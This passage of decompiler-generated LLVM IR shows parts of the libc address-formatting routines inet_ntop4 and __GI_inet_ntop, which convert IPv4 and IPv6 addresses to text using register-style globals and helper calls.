  %v1_80597fc = icmp eq i1 %v11_80597f7, false
  %v0_8059826 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_80597fc, label %dec_label_pc_8059824, label %dec_label_pc_80597fe

dec_label_pc_80597fe:                             ; preds = %dec_label_pc_80597d4
  %v3_8059802 = trunc i32 %v0_8059826 to i16
  %v5_8059802 = udiv i16 %v3_8059802, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8059802, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8059814 = trunc i16 %tmp42 to i8
  %v2_8059814 = or i8 %v1_8059814, 48
  %v12_8059814 = zext i8 %v2_8059814 to i32
  store i32 %v12_8059814, i32* %eax.global-to-local, align 4
  %v7_8059816 = icmp eq i8 %v1_8059814, 0
  store i1 %v7_8059816, i1* %zf.global-to-local, align 1
  store i8 %v2_8059814, i8* %v4_80597f7, align 1
  %v0_805981c = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805981c, label %dec_label_pc_8059847, label %dec_label_pc_805981e

dec_label_pc_805981e:                             ; preds = %dec_label_pc_80597fe
  store i32 %v1_80597ee, i32* @ecx, align 4
  br label %dec_label_pc_8059847

dec_label_pc_8059824:                             ; preds = %dec_label_pc_80597d4
  store i32 %v1_80597ee, i32* %ebx.global-to-local, align 4
  %v3_805982c = trunc i32 %v0_8059826 to i16
  %v5_805982c = udiv i16 %v3_805982c, 10
  %tmp43 = urem i16 %v5_805982c, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_805983c = add i32 %v0_80597ee, 2
  store i32 %v1_805983c, i32* @ecx, align 4
  %v1_8059841 = trunc i16 %tmp44 to i8
  %v2_8059841 = or i8 %v1_8059841, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8059841 = zext i8 %v2_8059841 to i32
  store i32 %v12_8059841, i32* %eax.global-to-local, align 4
  %v4_8059843 = add i32 %v0_80597ee, 44
  %v5_8059843 = add i32 %v4_8059843, %v0_80597f7
  %v6_8059843 = inttoptr i32 %v5_8059843 to i8*
  store i8 %v2_8059841, i8* %v6_8059843, align 1
  br label %dec_label_pc_8059847

dec_label_pc_8059847:                             ; preds = %dec_label_pc_80597fe, %dec_label_pc_805981e, %dec_label_pc_8059824
  %v0_8059847 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8059847 = inttoptr i32 %v0_8059847 to i8*
  %v2_8059847 = load i8, i8* %v1_8059847, align 1
  %v3_8059847 = zext i8 %v2_8059847 to i32
  store i32 %v3_8059847, i32* %eax.global-to-local, align 4
  %v0_8059850 = load i32, i32* @esi, align 4
  %v1_8059850 = add i32 %v0_8059850, 1
  store i32 %v1_8059850, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8059855 = load i32, i32* @esp, align 4
  %v1_8059855 = load i32, i32* @ecx, align 4
  %v2_8059855 = add i32 %v0_8059855, 44
  %v3_8059855 = add i32 %v2_8059855, %v1_8059855
  %v4_8059855 = inttoptr i32 %v3_8059855 to i8*
  store i8 46, i8* %v4_8059855, align 1
  %v0_805985a = load i32, i32* @ecx, align 4
  %v1_805985a = add i32 %v0_805985a, 2
  store i32 %v1_805985a, i32* %edi.global-to-local, align 4
  %v0_805985d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805985d = load i32, i32* %eax.global-to-local, align 4
  %v2_805985d = zext i32 %v1_805985d to i64
  %v3_805985d = load i32, i32* %edx.global-to-local, align 4
  %v4_805985d = zext i32 %v3_805985d to i64
  %v5_805985d = mul nuw i64 %v4_805985d, 4294967296
  %v6_805985d = or i64 %v5_805985d, %v2_805985d
  %v7_805985d = zext i32 %v0_805985d to i64
  %v8_805985d = udiv i64 %v6_805985d, %v7_805985d
  %v9_805985d = trunc i64 %v8_805985d to i32
  %v10_805985d = urem i64 %v6_805985d, %v7_805985d
  %v11_805985d = trunc i64 %v10_805985d to i32
  store i32 %v11_805985d, i32* @edx, align 4
  %v3_805985f = and i32 %v9_805985d, -256
  %v1_8059861 = trunc i64 %v10_805985d to i8
  %v2_8059861 = add i8 %v1_8059861, 48
  %v12_8059861 = zext i8 %v2_8059861 to i32
  %v15_8059861 = or i32 %v12_8059861, %v3_805985f
  store i32 %v15_8059861, i32* %eax.global-to-local, align 4
  %v2_8059863 = load i32, i32* @esp, align 4
  %v4_8059863 = add i32 %v0_805985a, 43
  %v5_8059863 = add i32 %v4_8059863, %v2_8059863
  %v6_8059863 = inttoptr i32 %v5_8059863 to i8*
  store i8 %v2_8059861, i8* %v6_8059863, align 1
  %v0_8059867 = load i32, i32* @esi, align 4
  %v10_8059867 = icmp eq i32 %v0_8059867, 3
  store i1 %v10_8059867, i1* %zf.global-to-local, align 1
  %v7_805986a = icmp sgt i32 %v0_8059867, 3
  %v1_8059870.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_805986a, label %dec_label_pc_8059870, label %dec_label_pc_80597d4

dec_label_pc_8059870:                             ; preds = %dec_label_pc_8059847, %entry
  %v1_8059870 = phi i32 [ 0, %entry ], [ %v1_8059870.pre, %dec_label_pc_8059847 ]
  %v0_8059870 = load i32, i32* @esp, align 4
  %v2_8059870 = add i32 %v0_8059870, 42
  %v3_8059870 = add i32 %v2_8059870, %v1_8059870
  %v4_8059870 = inttoptr i32 %v3_8059870 to i8*
  store i8 0, i8* %v4_8059870, align 1
  %v0_8059875 = load i32, i32* @esp, align 4
  %v9_8059875 = icmp eq i32 %v0_8059875, 12
  store i1 %v9_8059875, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_805987d = call i32 @strlen(i8* %tmp27)
  store i32 %v3_805987d, i32* @eax, align 4
  %v15_8059885 = icmp eq i32 %v3_805987d, %v0_80597bc
  store i1 %v15_8059885, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_805987d, %v0_80597bc
  br i1 %tmp45, label %dec_label_pc_805988b, label %dec_label_pc_805989a

dec_label_pc_805988b:                             ; preds = %dec_label_pc_8059870
  %v0_805988b = load i8*, i8** %stack_var_-92, align 4
  %v1_805988b = ptrtoint i8* %v0_805988b to i32
  %v2_805988b = call i32 @__errno_location(i32 %v1_805988b)
  %v1_8059890 = inttoptr i32 %v2_805988b to i32*
  store i32 28, i32* %v1_8059890, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80598a9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80598a9

dec_label_pc_805989a:                             ; preds = %dec_label_pc_8059870
  %v2_8059878 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_805989d4 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_805989d4, i32* %tmp29, align 4
  %v0_80598a1.cast = inttoptr i32 %v3_805989d4 to i8*
  %v4_80598a1 = call i32 @strcpy(i8* %v0_80598a1.cast, i32 %v2_8059878)
  store i32 %v4_80598a1, i32* %eax.global-to-local, align 4
  %v0_80598a6 = load i32, i32* @esp, align 4
  %v6_80598a6 = icmp eq i32 %v0_80598a6, -16
  store i1 %v6_80598a6, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80598a9

dec_label_pc_80598a9:                             ; preds = %dec_label_pc_805988b, %dec_label_pc_805989a
  %v0_80598b0 = phi i32 [ 0, %dec_label_pc_805988b ], [ %v4_80598a1, %dec_label_pc_805989a ]
  %v0_80598a9 = phi i32 [ %v0_80598a9.pre, %dec_label_pc_805988b ], [ %v15_80597a6, %dec_label_pc_805989a ]
  %v9_80598a9 = icmp eq i32 %v0_80598a9, -60
  store i1 %v9_80598a9, i1* %zf.global-to-local, align 1
  store i32 %v0_80597a2, i32* @esi, align 4
  store i32 %v0_80597a1, i32* @edi, align 4
  ret i32 %v0_80598b0

; uselistorder directives
  uselistorder i32 %v0_8059867, { 2, 0, 1 }
  uselistorder i8 %v2_8059841, { 1, 0 }
  uselistorder i32 %v0_8059826, { 1, 0 }
  uselistorder i1 %v11_80597f7, { 1, 0 }
  uselistorder i32 %v1_80597ee, { 1, 0 }
  uselistorder i32 %v5_80597dc, { 1, 0 }
  uselistorder i32 %v0_805986730, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 27, 28, 29, 18, 20, 21, 17, 19, 5, 22, 16, 23, 24, 25, 26, 31, 30, 32, 33, 15, 35, 36, 34, 6, 66, 37, 38, 67, 39, 40, 7, 68, 69, 41, 71, 72, 8, 46, 42, 9, 43, 44, 45, 47, 48, 10, 49, 50, 51, 70, 2, 3, 64, 62, 61, 59, 60, 12, 54, 13, 55, 14, 56, 53, 57, 58, 52, 11, 63, 65, 4 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 256, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 9, 5, 6, 0, 7, 10, 11, 1, 8, 2, 3, 4 }
  uselistorder i32 -65536, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_80598a9, { 1, 0 }
  uselistorder label %dec_label_pc_8059847, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80598b2 = load i32, i32* @edi, align 4
  %v0_80598b3 = load i32, i32* @esi, align 4
  %v0_80598b4 = load i32, i32* @ebx, align 4
  %v15_80598b5 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80598bc = icmp eq i32 %arg1, 2
  br i1 %v9_80598bc, label %dec_label_pc_80598cc, label %dec_label_pc_80598c1

dec_label_pc_80598c1:                             ; preds = %entry
  %v9_80598c1 = icmp eq i32 %arg1, 10
  %v1_80598c4 = icmp eq i1 %v9_80598c1, false
  br i1 %v1_80598c4, label %dec_label_pc_8059a6b, label %dec_label_pc_80598e4

dec_label_pc_80598cc:                             ; preds = %entry
  %v4_80598cc = ptrtoint i8* %arg3 to i32
  store i32 %v4_80598cc, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80598d8 = call i32 @inet_ntop4(i32 %v0_80598b4, i32 %v0_80598b3, i32 %v0_80598b2)
  store i32 %v3_80598d8, i32* %eax.global-to-local, align 4
  store i32 %v3_80598d8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059a78

dec_label_pc_80598e4:                             ; preds = %dec_label_pc_80598c1
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80598e9 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80598e9, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_80598ee = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_80598ee, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8059910 = add i32 %arg2, 1
  br label %dec_label_pc_80598fa

dec_label_pc_80598fa:                             ; preds = %dec_label_pc_80598fa.dec_label_pc_80598fa_crit_edge, %dec_label_pc_80598e4
  %v1_805991d = phi i32 [ %v15_80598b5, %dec_label_pc_80598e4 ], [ %v1_805991d.pre, %dec_label_pc_80598fa.dec_label_pc_80598fa_crit_edge ]
  %v0_805991570 = phi i32 [ 0, %dec_label_pc_80598e4 ], [ %v0_8059921.pre, %dec_label_pc_80598fa.dec_label_pc_80598fa_crit_edge ]
  %v1_8059903 = ashr i32 %v0_805991570, 31
  %v2_8059904 = zext i32 %v0_805991570 to i64
  %v4_8059904 = zext i32 %v1_8059903 to i64
  %v5_8059904 = mul nuw i64 %v4_8059904, 4294967296
  %v6_8059904 = or i64 %v5_8059904, %v2_8059904
  %v8_8059904 = sdiv i64 %v6_8059904, 2
  %v9_8059904 = trunc i64 %v8_8059904 to i32
  store i32 %v9_8059904, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8059904, i32* %ebx.global-to-local, align 4
  %v2_805990c = add i32 %v0_805991570, %arg2
  %v3_805990c = inttoptr i32 %v2_805990c to i8*
  %v4_805990c = load i8, i8* %v3_805990c, align 1
  %v5_805990c = zext i8 %v4_805990c to i32
  store i32 %v5_805990c, i32* %eax.global-to-local, align 4
  %v3_8059910 = add i32 %v2_8059910, %v0_805991570
  %v4_8059910 = inttoptr i32 %v3_8059910 to i8*
  %v5_8059910 = load i8, i8* %v4_8059910, align 1
  %v6_8059910 = zext i8 %v5_8059910 to i32
  store i32 %v6_8059910, i32* %edx.global-to-local, align 4
  %v1_8059915 = add i32 %v0_805991570, 2
  store i32 %v1_8059915, i32* %ecx.global-to-local, align 4
  %v2_8059918 = mul nuw nsw i32 %v5_805990c, 256
  %v2_805991b = or i32 %v6_8059910, %v2_8059918
  store i32 %v2_805991b, i32* %eax.global-to-local, align 4
  %v3_805991d = mul i32 %v9_8059904, 4
  %v4_805991d = add i32 %v3_805991d, 60
  %v5_805991d = add i32 %v4_805991d, %v1_805991d
  %v6_805991d = inttoptr i32 %v5_805991d to i32*
  store i32 %v2_805991b, i32* %v6_805991d, align 4
  %v0_8059921.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8059924 = icmp sgt i32 %v0_8059921.pre, 15
  br i1 %v7_8059924, label %dec_label_pc_8059926, label %dec_label_pc_80598fa.dec_label_pc_80598fa_crit_edge

dec_label_pc_80598fa.dec_label_pc_80598fa_crit_edge: ; preds = %dec_label_pc_80598fa
  %v1_805991d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80598fa

dec_label_pc_8059926:                             ; preds = %dec_label_pc_80598fa
  %v4_80598e4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8059930.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8059930

dec_label_pc_8059930:                             ; preds = %dec_label_pc_8059926, %dec_label_pc_805995d
  %v0_805995d69 = phi i32 [ 0, %dec_label_pc_8059926 ], [ %v1_805995d, %dec_label_pc_805995d ]
  %v0_805994868 = phi i32 [ -1, %dec_label_pc_8059926 ], [ %v0_80599488, %dec_label_pc_805995d ]
  %v0_805996867 = phi i32 [ -1, %dec_label_pc_8059926 ], [ %v0_805994d9, %dec_label_pc_805995d ]
  %v0_805997366 = phi i32 [ -1, %dec_label_pc_8059926 ], [ %v0_805995813, %dec_label_pc_805995d ]
  %v2_8059930 = mul nuw nsw i32 %v0_805995d69, 4
  %v3_8059930 = add nuw nsw i32 %v2_8059930, 60
  %v4_8059930 = add i32 %v3_8059930, %v0_8059930.pre
  %v5_8059930 = inttoptr i32 %v4_8059930 to i32*
  %v6_8059930 = load i32, i32* %v5_8059930, align 4
  %v7_8059930 = icmp eq i32 %v6_8059930, 0
  %v1_8059935 = icmp eq i1 %v7_8059930, false
  %v10_8059948 = icmp eq i32 %v0_805994868, -1
  br i1 %v1_8059935, label %dec_label_pc_8059948, label %dec_label_pc_8059937

dec_label_pc_8059937:                             ; preds = %dec_label_pc_8059930
  %v1_805993a = icmp eq i1 %v10_8059948, false
  br i1 %v1_805993a, label %dec_label_pc_8059945, label %dec_label_pc_805993c

dec_label_pc_805993c:                             ; preds = %dec_label_pc_8059937
  store i32 %v0_805995d69, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805995d

dec_label_pc_8059945:                             ; preds = %dec_label_pc_8059937
  %v0_8059945 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059945 = add i32 %v0_8059945, 1
  store i32 %v1_8059945, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805995d

dec_label_pc_8059948:                             ; preds = %dec_label_pc_8059930
  br i1 %v10_8059948, label %dec_label_pc_805995d, label %dec_label_pc_805994d

dec_label_pc_805994d:                             ; preds = %dec_label_pc_8059948
  %v10_805994d = icmp eq i32 %v0_805996867, -1
  %v0_8059956.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059952 = load i32, i32* @ebp, align 4
  %v7_8059954 = icmp sgt i32 %v0_8059956.pre, %v1_8059952
  %or.cond = or i1 %v10_805994d, %v7_8059954
  br i1 %or.cond, label %dec_label_pc_8059956, label %dec_label_pc_805995a

dec_label_pc_8059956:                             ; preds = %dec_label_pc_805994d
  store i32 %v0_8059956.pre, i32* @ebp, align 4
  store i32 %v0_805997366, i32* @edi, align 4
  br label %dec_label_pc_805995a

dec_label_pc_805995a:                             ; preds = %dec_label_pc_805994d, %dec_label_pc_8059956
  %v0_805994d11 = phi i32 [ %v0_805997366, %dec_label_pc_8059956 ], [ %v0_805996867, %dec_label_pc_805994d ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805995d

dec_label_pc_805995d:                             ; preds = %dec_label_pc_8059948, %dec_label_pc_8059945, %dec_label_pc_805993c, %dec_label_pc_805995a
  %v0_805995813 = phi i32 [ %v0_805997366, %dec_label_pc_8059948 ], [ %v0_805997366, %dec_label_pc_8059945 ], [ %v0_805995d69, %dec_label_pc_805993c ], [ -1, %dec_label_pc_805995a ]
  %v0_80599488 = phi i32 [ -1, %dec_label_pc_8059948 ], [ %v0_805994868, %dec_label_pc_8059945 ], [ %v0_805995d69, %dec_label_pc_805993c ], [ -1, %dec_label_pc_805995a ]
  %v0_805994d9 = phi i32 [ %v0_805996867, %dec_label_pc_8059948 ], [ %v0_805996867, %dec_label_pc_8059945 ], [ %v0_805996867, %dec_label_pc_805993c ], [ %v0_805994d11, %dec_label_pc_805995a ]
  %v1_805995d = add nuw nsw i32 %v0_805995d69, 1
  store i32 %v1_805995d, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805995d, 8
  br i1 %exitcond, label %dec_label_pc_8059963, label %dec_label_pc_8059930

dec_label_pc_8059963:                             ; preds = %dec_label_pc_805995d
  %v10_8059963 = icmp eq i32 %v0_805995813, -1
  br i1 %v10_8059963, label %dec_label_pc_8059975, label %dec_label_pc_8059968

dec_label_pc_8059968:                             ; preds = %dec_label_pc_8059963
  %v10_8059968 = icmp eq i32 %v0_805994d9, -1
  %v0_8059971.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8059968, label %dec_label_pc_8059971, label %dec_label_pc_805996d

dec_label_pc_805996d:                             ; preds = %dec_label_pc_8059968
  %v1_805996d = load i32, i32* @ebp, align 4
  %v7_805996f = icmp sgt i32 %v0_8059971.pre, %v1_805996d
  br i1 %v7_805996f, label %dec_label_pc_8059971, label %dec_label_pc_8059975

dec_label_pc_8059971:                             ; preds = %dec_label_pc_8059968, %dec_label_pc_805996d
  store i32 %v0_8059971.pre, i32* @ebp, align 4
  store i32 %v0_805995813, i32* @edi, align 4
  br label %dec_label_pc_8059975

dec_label_pc_8059975:                             ; preds = %dec_label_pc_805996d, %dec_label_pc_8059963, %dec_label_pc_8059971
  %v5_8059982 = phi i32 [ %v0_805994d9, %dec_label_pc_805996d ], [ %v0_805994d9, %dec_label_pc_8059963 ], [ %v0_805995813, %dec_label_pc_8059971 ]
  %v10_8059975 = icmp eq i32 %v5_8059982, -1
  br i1 %v10_8059975, label %dec_label_pc_8059985, label %dec_label_pc_805997a

dec_label_pc_805997a:                             ; preds = %dec_label_pc_8059975
  %v0_805997a = load i32, i32* @ebp, align 4
  %v1_805997a = add i32 %v0_805997a, -1
  %v6_805997a = sub i32 0, %v0_805997a
  %v7_805997a = and i32 %v0_805997a, %v6_805997a
  %v8_805997a = icmp slt i32 %v7_805997a, 0
  %v9_805997a = icmp eq i32 %v1_805997a, 0
  %v10_805997a = icmp slt i32 %v1_805997a, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8059982 = icmp ne i1 %v10_805997a, %v8_805997a
  %v4_8059982 = or i1 %v9_805997a, %v3_8059982
  %v7_8059982 = select i1 %v4_8059982, i32 -1, i32 %v5_8059982
  store i32 %v7_8059982, i32* @edi, align 4
  br label %dec_label_pc_8059985

dec_label_pc_8059985:                             ; preds = %dec_label_pc_8059975, %dec_label_pc_805997a
  %v0_8059a2518 = phi i32 [ %v5_8059982, %dec_label_pc_8059975 ], [ %v7_8059982, %dec_label_pc_805997a ]
  %v2_8059985 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8059985, i32* @ebx, align 4
  %v3_8059a07 = add i32 %v4_80598e4, 64
  %v12_80599c5 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8059a2558 = icmp eq i32 %v0_8059a2518, -1
  %v1_80599cd = icmp eq i1 %v12_80599c5, false
  br label %dec_label_pc_8059990

dec_label_pc_8059990:                             ; preds = %dec_label_pc_8059985, %dec_label_pc_8059a1b
  %v10_8059a2565 = phi i1 [ %v10_8059a2558, %dec_label_pc_8059985 ], [ %v10_8059a25, %dec_label_pc_8059a1b ]
  %v0_80599aa64 = phi i32 [ 0, %dec_label_pc_8059985 ], [ %v1_8059a1b, %dec_label_pc_8059a1b ]
  %v1_80599a063 = phi i32 [ %v0_8059a2518, %dec_label_pc_8059985 ], [ %v0_8059a25.pre, %dec_label_pc_8059a1b ]
  %v0_80599ae62 = phi i32 [ %v2_8059985, %dec_label_pc_8059985 ], [ %v0_80599a419, %dec_label_pc_8059a1b ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_8059985 ], [ %stack_var_-120.0, %dec_label_pc_8059a1b ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_8059985 ], [ %stack_var_-116.0, %dec_label_pc_8059a1b ]
  br i1 %v10_8059a2565, label %dec_label_pc_80599aa, label %dec_label_pc_8059995

dec_label_pc_8059995:                             ; preds = %dec_label_pc_8059990
  %v2_8059995 = sub i32 %v0_80599aa64, %v1_80599a063
  %v8_8059995 = xor i32 %v0_80599aa64, %v1_80599a063
  %v9_8059995 = xor i32 %v2_8059995, %v0_80599aa64
  %v10_8059995 = and i32 %v9_8059995, %v8_8059995
  %v11_8059995 = icmp slt i32 %v10_8059995, 0
  %v12_8059995 = icmp eq i32 %v2_8059995, 0
  %v13_8059995 = icmp slt i32 %v2_8059995, 0
  %v2_8059997 = icmp eq i1 %v13_8059995, %v11_8059995
  br i1 %v2_8059997, label %dec_label_pc_8059999, label %dec_label_pc_80599aa

dec_label_pc_8059999:                             ; preds = %dec_label_pc_8059995
  %v1_8059999 = load i32, i32* @ebp, align 4
  %v2_8059999 = add i32 %v1_8059999, %v1_80599a063
  store i32 %v2_8059999, i32* %eax.global-to-local, align 4
  %v2_805999c = sub i32 %v0_80599aa64, %v2_8059999
  %v8_805999c = xor i32 %v2_8059999, %v0_80599aa64
  %v9_805999c = xor i32 %v2_805999c, %v0_80599aa64
  %v10_805999c = and i32 %v9_805999c, %v8_805999c
  %v11_805999c = icmp slt i32 %v10_805999c, 0
  %v13_805999c = icmp slt i32 %v2_805999c, 0
  %v2_805999e = icmp eq i1 %v13_805999c, %v11_805999c
  br i1 %v2_805999e, label %dec_label_pc_80599aa, label %dec_label_pc_80599a0

dec_label_pc_80599a0:                             ; preds = %dec_label_pc_8059999
  %v1_80599a2 = icmp eq i1 %v12_8059995, false
  br i1 %v1_80599a2, label %dec_label_pc_8059a1b, label %dec_label_pc_80599a4

dec_label_pc_80599a4:                             ; preds = %dec_label_pc_80599a0
  %v1_80599a4 = inttoptr i32 %v0_80599ae62 to i8*
  store i8 58, i8* %v1_80599a4, align 1
  %v0_80599a7 = load i32, i32* @ebx, align 4
  %v1_80599a7 = add i32 %v0_80599a7, 1
  store i32 %v1_80599a7, i32* @ebx, align 4
  br label %dec_label_pc_8059a1b

dec_label_pc_80599aa:                             ; preds = %dec_label_pc_8059995, %dec_label_pc_8059999, %dec_label_pc_8059990
  %v1_80599aa = icmp eq i32 %v0_80599aa64, 0
  br i1 %v1_80599aa, label %dec_label_pc_80599b2, label %dec_label_pc_80599ae

dec_label_pc_80599ae:                             ; preds = %dec_label_pc_80599aa
  %v1_80599ae = inttoptr i32 %v0_80599ae62 to i8*
  store i8 58, i8* %v1_80599ae, align 1
  %v0_80599b1 = load i32, i32* @ebx, align 4
  %v1_80599b1 = add i32 %v0_80599b1, 1
  store i32 %v1_80599b1, i32* @ebx, align 4
  %v0_80599b2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80599b2

dec_label_pc_80599b2:                             ; preds = %dec_label_pc_80599aa, %dec_label_pc_80599ae
  %v0_8059a10 = phi i32 [ %v0_80599ae62, %dec_label_pc_80599aa ], [ %v1_80599b1, %dec_label_pc_80599ae ]
  %v1_8059a07 = phi i32 [ 0, %dec_label_pc_80599aa ], [ %v0_80599b2.pre, %dec_label_pc_80599ae ]
  %v9_80599b2 = icmp eq i32 %v1_8059a07, 6
  %v1_80599b5 = icmp eq i1 %v9_80599b2, false
  br i1 %v1_80599b5, label %dec_label_pc_8059a06, label %dec_label_pc_80599b7

dec_label_pc_80599b7:                             ; preds = %dec_label_pc_80599b2
  %v0_80599b7 = load i32, i32* @edi, align 4
  %v1_80599b7 = icmp eq i32 %v0_80599b7, 0
  %v1_80599b9 = icmp eq i1 %v1_80599b7, false
  br i1 %v1_80599b9, label %dec_label_pc_8059a06, label %dec_label_pc_80599bb

dec_label_pc_80599bb:                             ; preds = %dec_label_pc_80599b7
  %v0_80599bb = load i32, i32* @ebp, align 4
  %v9_80599bb = icmp eq i32 %v0_80599bb, 6
  br i1 %v9_80599bb, label %dec_label_pc_80599cf, label %dec_label_pc_80599c0

dec_label_pc_80599c0:                             ; preds = %dec_label_pc_80599bb
  %v9_80599c0 = icmp eq i32 %v0_80599bb, 5
  %v1_80599c3 = icmp eq i1 %v9_80599c0, false
  br i1 %v1_80599c3, label %dec_label_pc_8059a06, label %dec_label_pc_80599c5

dec_label_pc_80599c5:                             ; preds = %dec_label_pc_80599c0
  br i1 %v1_80599cd, label %dec_label_pc_8059a06, label %dec_label_pc_80599cf

dec_label_pc_80599cf:                             ; preds = %dec_label_pc_80599c5, %dec_label_pc_80599bb
  %v2_80599d5 = sub i32 %v0_8059a10, %v2_8059985
  store i32 %v2_80599d5, i32* @esi, align 4
  %v2_80599e0 = sub i32 46, %v2_80599d5
  store i32 %v2_80599e0, i32* @ecx, align 4
  store i32 %v0_8059a10, i32* @edx, align 4
  %v1_80599e4 = add i32 %arg2, 12
  store i32 %v1_80599e4, i32* @eax, align 4
  %v0_80599e7 = load i8*, i8** %stack_var_-124, align 4
  %v1_80599e7 = ptrtoint i8* %v0_80599e7 to i32
  %v3_80599e7 = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_80599e7 = call i32 @inet_ntop4(i32 %v1_80599e7, i32 %v3_80599e7, i32 %stack_var_-116.160)
  store i32 %v5_80599e7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80599ee = icmp eq i32 %v5_80599e7, 0
  br i1 %v1_80599ee, label %dec_label_pc_8059a78, label %dec_label_pc_80599f6

dec_label_pc_80599f6:                             ; preds = %dec_label_pc_80599cf
  %v0_80599f9 = load i32, i32* @ebx, align 4
  %v5_80599f9 = inttoptr i32 %v0_80599f9 to i8*
  store i8* %v5_80599f9, i8** %stack_var_-124, align 4
  %v3_80599fa = call i32 @strlen(i8* %v5_80599f9)
  store i32 %v3_80599fa, i32* %eax.global-to-local, align 4
  %v0_8059a02 = load i32, i32* @ebx, align 4
  %v3_8059a02 = add i32 %v0_8059a02, %v3_80599fa
  store i32 %v3_8059a02, i32* @ebx, align 4
  %v0_8059a2a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8059a2a

dec_label_pc_8059a06:                             ; preds = %dec_label_pc_80599c5, %dec_label_pc_80599c0, %dec_label_pc_80599b7, %dec_label_pc_80599b2
  %v0_8059a06 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8059a06, i32* %stack_var_-112, align 4
  %v2_8059a07 = mul i32 %v1_8059a07, 4
  %v4_8059a07 = add i32 %v3_8059a07, %v2_8059a07
  %v5_8059a07 = inttoptr i32 %v4_8059a07 to i32*
  %v6_8059a07 = load i32, i32* %v5_8059a07, align 4
  %v5_8059a10 = inttoptr i32 %v0_8059a10 to i8*
  store i8* %v5_8059a10, i8** %stack_var_-124, align 4
  %v4_8059a11 = call i32 @sprintf(i32 %v0_8059a10, i32 ptrtoint ([3 x i8]* @global_var_805d0b7.348 to i32))
